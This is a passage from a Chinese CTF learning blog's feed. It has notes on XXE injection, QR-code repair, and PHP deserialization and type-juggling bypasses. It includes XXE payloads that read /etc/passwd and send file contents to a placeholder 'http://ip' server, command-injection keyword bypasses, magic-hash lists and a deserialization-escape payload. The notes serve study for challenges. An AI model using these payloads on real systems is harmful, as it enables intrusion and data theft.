class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY c0pyright <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">author</span>&gt;</span><span class="hljs-symbol">&amp;file;</span>&amp;c0pyright;<span class="hljs-tag">&lt;/<span class="hljs-name">author</span>&gt;</span><br></code></pre></td></tr></table></figure><p>tips<br>实体引用<br>在xml里，如果把’&lt;’’&gt;’之类的字符直接放进去，会被解析，然后出现错误，为此要用实体引用来代替(类似转义)</p><p>&lt; &lt; 小于</p><blockquote><blockquote><p>大于<br>&amp; &amp; 和号<br>&apos; ‘ 单引号<br>“ “ 引号</p></blockquote></blockquote><p>eg:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span>100&amp;lt1000<span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span><br></code></pre></td></tr></table></figure><p>php解析xml的函数<br>DOMDocument()<br>PHP5中提供了DOMDocument类对XML的解析</p><p>simplexml_import_dom()</p><p>simplexml_import_dom($dom)获取XML文档节点，如果成功则返回SimpleXMLElement对象</p><p>libxml_disable_entity_loader(false); #- 禁用加载外部实体的功能，默认为True，所以学xxe真的能用得上吗(萌新日常怀疑)</p><p>simple_xml_load_string(): 转换形式良好的 XML 字符串为 SimpleXMLElement 对象，然后输出对象的键和元素</p><h1 id="XXE盲注"><a href="#XXE盲注" class="headerlink" title="XXE盲注"></a>XXE盲注</h1><p>在刷了一些比较简单的题后，开始进入盲注，先学习下姿势的原理(看bw大佬的文章)<br>首先需要了解1个报错</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">roottag</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">start</span> <span class="hljs-string">&quot;&lt;![CDATA[&quot;</span>&gt;</span> </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">goodies</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///xxx.txt&quot;</span>&gt;</span> </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">end</span> <span class="hljs-string">&quot;]]&gt;&quot;</span>&gt;</span> </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">all</span> <span class="hljs-string">&quot;%start;%goodies;%end;&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">roottag</span>&gt;</span><span class="hljs-symbol">&amp;all;</span><span class="hljs-tag">&lt;/<span class="hljs-name">roottag</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>这样做会报错，原因是我也没看懂…..总之需要在外部实体拼接后再在DTD中调用，也就是下面的做法，引用外部服务器里的文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">roottag</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">start</span> <span class="hljs-string">&quot;&lt;![CDATA[&quot;</span>&gt;</span> </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">goodies</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///xxx.txt&quot;</span>&gt;</span> </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">end</span> <span class="hljs-string">&quot;]]&gt;&quot;</span>&gt;</span> </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://ip/evil.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">%dtd;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">roottag</span>&gt;</span><span class="hljs-symbol">&amp;all;</span><span class="hljs-tag">&lt;/<span class="hljs-name">roottag</span>&gt;</span><br><br><span class="hljs-comment">&lt;!--evil.dtd--&gt;</span><br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">all</span> <span class="hljs-string">&quot;%start;%goodies;%end;&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>无回显:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--evil.dtd--&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///xxx.txt&quot;</span>&gt;</span>    <span class="hljs-comment">&lt;!--xxx.txt为敏感文件--&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">int</span> <span class="hljs-string">&quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://ip?p=%file;&#x27;&gt;&quot;</span>&gt;</span>   <span class="hljs-comment">&lt;!--此处的&amp;#37;为转义的%--&gt;</span><br><br><span class="hljs-comment">&lt;!--payload--&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">convert</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">remote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://ip/evil.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">%remote;%int;%send;</span><br><span class="hljs-meta">]&gt;</span><br></code></pre></td></tr></table></figure><p>如上，先引用remote，于是引用了evil.dtd，就相当于将evil.dtd里的内容拼接到payload里<br>然后再引用int，int声明了send，再引用了send，send就执行了 [<code>]http://ip=%file;[</code>]的操作，将file.txt发送到你的服务器，解决了xxe无回显的问题,tttttttttttttqqqqqqllllllllllllll</p><p>3.22 那么问题来了，就是我还没个服务器….<br>有台旧电脑，明天坐教室后排好好整整，八字还没一撇……</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2021_summary?</title>
    <link href="/2022/02/02/2021-summary/"/>
    <url>/2022/02/02/2021-summary/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="14d78877d0d27c636803c9db7e7a3ad156b27454a96fa0f07e031d6c155cb25c"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">为菈妮，我变成狼人模样</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>随记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>随记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>二维码补全</title>
    <link href="/2022/01/13/%E4%BA%8C%E7%BB%B4%E7%A0%81%E8%A1%A5%E5%85%A8/"/>
    <url>/2022/01/13/%E4%BA%8C%E7%BB%B4%E7%A0%81%E8%A1%A5%E5%85%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>直接上总结: 二维码右半部分是数据区(存储数据)，左半部分是校验区(验证扫到的二维码有没有缺漏啥的)，左上、左下、右下左上的那几个大小方块叫做定位块(顾名思义就是用来定位二维码的)</p><p>根据上面这段话阔以得出以下结论:<br>1、有了右半部分就相当于有了全部数据<br>2、在右半部分和左半部分都有一定缺失的情况下，若缺失在一定比例，则仍可以获得信息 (这是根据1个叫里德-所罗门的纠错算法实现的，涉及数学并8需要理解)<br>3、在缺失定位块导致无法扫描二维码的情况下，只要把定位块补全就可以了(最简单的，电脑里的画图程序就阔以做到这点)</p><p>这里推荐一个链接，<a href="https://h3110w0r1d.com/qrazybox/">qrazybox</a>，可以在线进行手撕，点击tools-&gt;强制解码的选项，就阔以提取二维码里的信息啦</p><h1 id="前置知识，关于二维码"><a href="#前置知识，关于二维码" class="headerlink" title="前置知识，关于二维码"></a>前置知识，关于二维码</h1><p>二维码补全也算misc的1个题型，最近摆烂打ctf做了一个有手就行的题，8过还是花了将近半个白天，而反观一块打的梁佬，只靠网上找相关资料和阅读官方源文档就还原出了二维码，只能说自己的学习能力有待提高</p><p>在做的时候，bbs里的1个wp帮忙少绕了很多弯，但也有些8好的地方，就是….这位大佬是纯手撕的，也就是把二维码的像素写在纸上然后手动根据掩码进行异或，这……只能说tql，真的头铁，于是俺一开始也陷入误区，<del>拿出纸笔</del>准备手撕来着</p><p>然后才知道在用对了工具后，这题可以有多简单</p><p>首先了解一下二维码的组成<br><img src="/images/%E6%8A%97%E7%96%ABctf/misc(5).jpeg"></p><p>可以看到，二维码的右半部分是数据块(data)，而左半部分是校验块(error_correction)，因此有了右半部分就等于有了全部信息，所以这道misc并不算撕二维码中的难题，只要把右半部分翻译就行了，但还是做了很久，因为当时头铁，抄在了纸上直接异或手撕，根本没想过网上有没有工具可以利用，只能说智商堪忧。</p><p>另外，标红的地方记录着二维码的样式信息，本题只能看到右上角的部分，但这就够了</p><h1 id="一道简单例题的wp"><a href="#一道简单例题的wp" class="headerlink" title="一道简单例题的wp"></a>一道简单例题的wp</h1><p>下载文件，发现是个只有半截的二维码<br><img src="/images/%E6%8A%97%E7%96%ABctf/misc(3).jpg"></p><p>然后回到这道题，根据半截二维码可读出右上方部分的样式信息，即format的后8位，为: 11010000，根据这个阔以确定掩码类型，由下图可知，为:H3<br><img src="/images/%E6%8A%97%E7%96%ABctf/misc(6).jpeg"><br>其中H代表纠错级别，为30%(即可还原30%损坏的数据块), 而3则代表掩码图案，如下图。至于掩码图案有啥用，上面的链接有写<br><img src="/images/%E6%8A%97%E7%96%ABctf/misc(7).jpeg"></p><p>于是在确定了掩码类型后，就阔以撕了!<br>先在上面说过的在线撕二维码的网站里把二维码都填进去<br><img src="/images/%E6%8A%97%E7%96%ABctf/misc(4).png"></p><p>然后，根据确定的掩码图案类型，选中Tools-&gt;Data Masking(掩码异或)-&gt;对应的掩码类型(此处为3)，进行异或</p><p><img src="/images/%E6%8A%97%E7%96%ABctf/misc(8).png"></p><p>然后再选择Tools-&gt;Extract QR Information(强制解码)，然后就出flag了……没错，就这么简单<br><img src="/images/%E6%8A%97%E7%96%ABctf/misc(9).png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php反序列化姿势学习&amp;一些绕过</title>
    <link href="/2022/01/11/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A7%BF%E5%8A%BF%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/01/11/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A7%BF%E5%8A%BF%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>反序列化漏洞，web入门基础之一,记录了一些姿势和绕过</p><p>php反序列化漏洞的原理，俺觉得这篇文章讲的8错，适合php0基础小白: <a href="https://blog.csdn.net/weixin_42751456/article/details/88758908">链接</a><br>总结:<br>unserialize漏洞依赖几个条件：<br>unserialize函数的参数可控<br>脚本中存在一个构造函数（__construct()）、析构函数（__destruct()）、__wakeup()函数中有向php文件中写数据的操作的类<br>所写的内容需要有对象中的成员变量的值</p><h1 id="一些绕过"><a href="#一些绕过" class="headerlink" title="一些绕过"></a>一些绕过</h1><h2 id="is-numeric-绕过"><a href="#is-numeric-绕过" class="headerlink" title="is_numeric()绕过"></a>is_numeric()绕过</h2><p>利用数组绕过: 大部分php不会判断数组</p><h2 id="强等于、弱等于绕过"><a href="#强等于、弱等于绕过" class="headerlink" title="强等于、弱等于绕过"></a>强等于、弱等于绕过</h2><p>弱等于判断的时候，如果两边的类型不同，则先是将类型转换成相同的，再进行比较<br>强等于判断的时候，先判断类型是否一样，不一样直接false，一样才比较</p><p>弱等于的转换:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">&quot;admin&quot;</span>==<span class="hljs-number">0</span>;<span class="hljs-comment">//true</span><br><span class="hljs-string">&quot;1admin&quot;</span>=<span class="hljs-number">1</span>;<span class="hljs-comment">//true</span><br><span class="hljs-string">&quot;3%00&quot;</span>=<span class="hljs-number">3</span>;<span class="hljs-comment">//true</span><br></code></pre></td></tr></table></figure><p>以及:<br>&#x3D;&#x3D;对于所有0e开头的都为相等<br>进行比较运算时，如果遇到了0e\d+这种字符串，就会将这种字符串解析为科学计数法</p><h2 id="关键词屏蔽绕过"><a href="#关键词屏蔽绕过" class="headerlink" title="关键词屏蔽绕过"></a>关键词屏蔽绕过</h2><p>变量覆盖:<br>eg: flag为屏蔽词，且贪婪匹配<br>?ip&#x3D;127.0.0.1;a&#x3D;g;cat$IFS$1fla$a.php有flag<br>?ip&#x3D;127.0.0.1;b&#x3D;ag;a&#x3D;fl;cat$IFS$1$a$b.php 有flag</p><h2 id="md5绕过"><a href="#md5绕过" class="headerlink" title="md5绕过"></a>md5绕过</h2><p>0e绕过<br>处理hash字符串时，PHP会将每一个以 0E开头的哈希值解释为0，那么只要传入的不同字符串经过哈希以后是以 0E开头的，那么PHP会认为它们相同</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;s878926199a&quot;</span>;<br><span class="hljs-variable">$b</span> = <span class="hljs-string">&quot;s155964671a&quot;</span>;<br><span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>);<span class="hljs-comment">//true</span><br><span class="hljs-variable">$a1</span> = <span class="hljs-string">&quot;0e33&quot;</span>;<br><span class="hljs-variable">$b1</span> = <span class="hljs-string">&quot;0e89&quot;</span>;<br><span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a1</span>)=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b1</span>);<span class="hljs-comment">//true</span><br></code></pre></td></tr></table></figure><p>数组绕过<br>在 PHP5 和 PHP7 中，当两个 md5 进行比较时，若参数是不同的数组，那么 &#x3D;&#x3D; 和 &#x3D;&#x3D;&#x3D; 比较的结果均为 True</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;a&quot;</span>];<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;b&quot;</span>];<br><span class="hljs-comment">//输入?a[]=1&amp;b[]=2</span><br><span class="hljs-variable">$a</span>===<span class="hljs-variable">$b</span>;<span class="hljs-comment">//true</span><br></code></pre></td></tr></table></figure><p>md5碰撞<br>需要用到1个叫fastcoll.exe的软件，这个软件的功能有点牛逼，可以输入1一个a软件(也可以是.txt)，然后输出b和c软件，b和c的名字8同，但md5值是相同的</p><h2 id="php弱-强类型比较-一些作业"><a href="#php弱-强类型比较-一些作业" class="headerlink" title="php弱\强类型比较 &amp;&amp; 一些作业"></a>php弱\强类型比较 &amp;&amp; 一些作业</h2><p>感觉像是只会出现在ctf里的绕过…</p><p>成因:<br>&#x3D;&#x3D; 在进行比较的时候，会先将两边的变量类型转化成相同的，再进行比较<br>0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0。<br>因此CTF比赛中需要用到弱类型HASH比较缺陷最明显的标志便是管理员密码MD5之后的值是以0e开头</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs smali">ej0D<br>ek06<br>el08<br>eo0n<br>ey0M<br>ey0O<br>ez0s<br>e006<br>e10l<br>eU3Z<br>eW3vfSoL<br>fToh<br>fTo1<br>fUoU<br>fYou<br>fapF<br>fbpf<br>fdpF<br>fnpZ<br>fppr<br>fqpa<br>frpj<br>fwpD<br>fyp5<br>f1p2<br>f4pN<br>f7pu<br>fDpQ<br>fHpP<br>fIp4<br>fJpX<br>fLpv<br>fOpi<br>fQp3<br>fTpi<br>fVpz<br>feqN<br>fjqN<br>fvq1<br>fyqy<br>fAqJ<br>fEqk<br>fFqg<br>fFqi<br>fHqX<br>fIqF<br>fKqh<br>fLq6<br>fQq6<br>fQqA<br>fRql<br>fUq4<br>fUqA<br>fXq0<br>farg<br>farJ<br>ftrT<br>f7rm<br>fCrB<br>fErY<br>fIrt<br>QNKCDZO<br>s878926199a<br>s155964671a<br>s214587387a<br>s214587387a<br>s878926199a<br></code></pre></td></tr></table></figure><p>至于强类型&#x3D;&#x3D;&#x3D;，则阔以通过数组绕过(数组返回NULL)，比如要求$param1!&#x3D;&#x3D;$param2，但md5($param1)&#x3D;&#x3D;&#x3D;md5($param2):</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">param1</span>[]=<span class="hljs-number">1</span>&amp;param2[]=<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>传数组的方法也可以用来绕过sha1()等hash加密函数相关的判断，也可以绕过正则判断，可以说值得记忆</p><h1 id="各种姿势"><a href="#各种姿势" class="headerlink" title="各种姿势"></a>各种姿势</h1><h2 id="反序列化逃逸"><a href="#反序列化逃逸" class="headerlink" title="反序列化逃逸"></a>反序列化逃逸</h2><p>这是学完反序列化漏洞后做的第1个题，不算真正的反序列化漏洞题，利用了unserialize函数的1个特性<br>进入网页，php源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);   <span class="hljs-comment">//flag.php!!!!!!!!!</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">replace</span>(<span class="hljs-params"><span class="hljs-variable">$payload</span></span>)</span>&#123;<br>    <span class="hljs-variable">$filter</span>=<span class="hljs-string">&quot;/flag/i&quot;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&quot;nono!&quot;</span>,<span class="hljs-variable">$payload</span>); <span class="hljs-comment">//匹配payload中的filter并替换，此处的/i表示大小写不敏感，(在菜鸟在线里验证过，单双引号的区别</span><br>&#125;;<br><span class="hljs-variable">$sss</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ky&#x27;</span>];  <span class="hljs-comment">//单引号，不转义, 此处为用户输入的可构造payload部分</span><br><span class="hljs-variable">$ctf</span>[<span class="hljs-string">&#x27;sss1&#x27;</span>]=<span class="hljs-string">&#x27;webwebweb&#x27;</span>;<br><span class="hljs-variable">$ctf</span>[<span class="hljs-string">&#x27;sss2&#x27;</span>]=<span class="hljs-string">&#x27;pwnpwnpwn&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$sss</span>))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$sss</span>,<span class="hljs-string">&#x27;flag&#x27;</span>)&gt;=<span class="hljs-number">0</span>)&#123;<span class="hljs-comment">//返回flag在php中第一次出现位置的数字 若没有则返回FALSE，所以必须出现上述</span><br>        <span class="hljs-variable">$ctf</span>[<span class="hljs-string">&#x27;sss1&#x27;</span>]=<span class="hljs-variable">$sss</span>;  <span class="hljs-comment">//ss1换成payload</span><br>        <span class="hljs-variable">$ctf</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">replace</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$ctf</span>)));<span class="hljs-comment">//serialize:序列化一个对象或数组，返回字符串；调用replace，把&quot;/flag/i&quot;换成nono!，可以双写绕过</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$ctf</span>[<span class="hljs-string">&#x27;sss2&#x27;</span>]===<span class="hljs-string">&quot;webwebweb&quot;</span>)&#123;   <span class="hljs-comment">//3个=，强比较，没法绕</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;nonono!&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>还算简单，俺这个没学过php的勉强能看懂，那么怎么构造呢?当时半天没想出来，后来kill7imer师傅花了20min就做出来了，是俺太笨了呜呜呜<br>payload:<br>    flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag”;s:4:”sss2”;s:9:”webwebweb”;}</p><p>大致原理</p><p>在unserialize反序列化时，若参数字符串不符合序列化的标准格式(比如数字和实际字符长度不匹配)，那么反序列化失败，unserialize啥也8会返回，因此此处要输入很多’flag’确保被替换成’nono!’后也满足序列化格式</p><p>然后后面的咋解决呢? 8用解决，因为unserialize在操作完后就8会管后面的字符串，因此闭合、填充就可以了，这就叫反序列化逃逸</p><h2 id="各种魔术方法在什么时候被调用"><a href="#各种魔术方法在什么时候被调用" class="headerlink" title="各种魔术方法在什么时候被调用"></a>各种魔术方法在什么时候被调用</h2><p>__construct: 对象被创建(实例化)时被调用<br>__set: 出现异常时调用(比如访问1个8存在的属性)，用于将数据写入不可访问的属性<br>__sleep: 在对象被序列化时被调用(先__sleep，然后serialize)<br>__wakeup: 在对象被反序列化时被调用(先__wakeup，然后unserialize)<br>__destruct: 在对象被销毁时被调用(可以利用之删除某些文件)(4nd绝大部分情况下php会自动删除对象，也就是这个函数一般一定会被调用)</p><p>__toString 当一个对象被当作字符串使用时被调用, 返回值需为字符串(eg: echo $obj)<br>__call() 在对象上下文中调用不可访问的方法时触发<br>__callStatic() 在静态上下文中调用不可访问的方法时触发<br>__get() 用于从不可访问的属性读取数据&#x2F;&#x2F;调用私有属性时使用<br>__isset() 在不可访问的属性上调用isset()或empty()触发<br>__unset() 在不可访问的属性上使用unset()时触发<br>__invoke() 当脚本尝试将对象调用为函数时触发</p><h2 id="改变属性数绕过-wakeup"><a href="#改变属性数绕过-wakeup" class="headerlink" title="改变属性数绕过__wakeup"></a>改变属性数绕过__wakeup</h2><p>原理: 当序列化字符串中表示对象属性个数的数字值大于真实类中属性的个数时就会跳过__wakeup的执行</p><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><p>如果类中含有protect或者private变量，那么里面可能会有空字符，在复制时无法复制进去，于是需要我们在burp抓包后手动用”%00”填充<br>比如:<br><img src="/images/%E5%88%B7%E9%A2%98/buuctf(3).png"></p><p>php的版本不同，可能会导致反序列化的结果也不同</p><h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><h2 id="php-极客大挑战2019-反序化之跳过-wakeup执行"><a href="#php-极客大挑战2019-反序化之跳过-wakeup执行" class="headerlink" title="php 极客大挑战2019 (反序化之跳过__wakeup执行)"></a>php 极客大挑战2019 (反序化之跳过__wakeup执行)</h2><p>操了，忘了网站的备份文件这个知识点: <a href="http://www.zip是网站的备份文件/">www.zip是网站的备份文件</a></p><p>通过这题再学习一下php反序列化漏洞<br>然后根据提示，下载<a href="http://www.zip文件,查看class.php(这里有个dirsearch的扫网站后台目录脚本阔以用一手)/">www.zip文件，查看class.php(这里有个dirsearch的扫网站后台目录脚本阔以用一手)</a>: </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span> = <span 